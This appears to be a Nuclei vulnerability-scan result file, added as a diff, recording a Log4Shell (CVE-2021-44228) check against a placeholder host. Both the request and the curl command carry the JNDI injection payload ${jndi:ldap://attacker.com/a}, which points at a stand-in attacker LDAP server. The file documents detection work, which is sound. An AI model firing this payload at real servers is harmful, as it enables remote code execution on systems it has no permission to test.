@@ -1,0 +1,38 @@
+{
+  "template": "cves/2021/CVE-2021-44228.yaml",
+  "template-url": "https://templates.nuclei.sh/public/CVE-2021-44228",
+  "template-id": "CVE-2021-44228",
+  "template-path": "/home/user/nuclei-templates/cves/2021/CVE-2021-44228.yaml",
+  "info": {
+    "name": "Apache Log4j2 Remote Code Execution",
+    "author": ["pdteam", "akincibor"],
+    "tags": ["cve", "cve2021", "rce", "log4j", "critical"],
+    "description": "Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.",
+    "reference": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+      "https://logging.apache.org/log4j/2.x/security.html",
+      "https://www.lunasec.io/docs/blog/log4j-zero-day/"
+    ],
+    "severity": "critical",
+    "metadata": {
+      "max-request": 1,
+      "shodan-query": "http.html:log4j"
+    },
+    "classification": {
+      "cve-id": "CVE-2021-44228",
+      "cwe-id": ["CWE-77", "CWE-94"],
+      "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+      "cvss-score": 10.0
+    }
+  },
+  "type": "http",
+  "host": "https://vulnerable-app.example.com",
+  "matched-at": "https://vulnerable-app.example.com/api/login",
+  "request": "POST /api/login HTTP/1.1\r\nHost: vulnerable-app.example.com\r\nUser-Agent: ${jndi:ldap://attacker.com/a}\r\nContent-Type: application/json\r\n\r\n{\"username\":\"${jndi:ldap://attacker.com/a}\",\"password\":\"test\"}",
+  "response": "HTTP/1.1 500 Internal Server Error\r\nContent-Type: application/json\r\n\r\n{\"error\":\"Internal server error\"}",
+  "timestamp": "2026-01-15T10:32:18.987654321Z",
+  "matcher-status": true,
+  "curl-command": "curl -X 'POST' -d '{\"username\":\"${jndi:ldap://attacker.com/a}\",\"password\":\"test\"}' -H 'Content-Type: application/json' 'https://vulnerable-app.example.com/api/login'",
+  "matcher-name": "log4j-detection",
+  "ip": "203.0.113.50"
+}
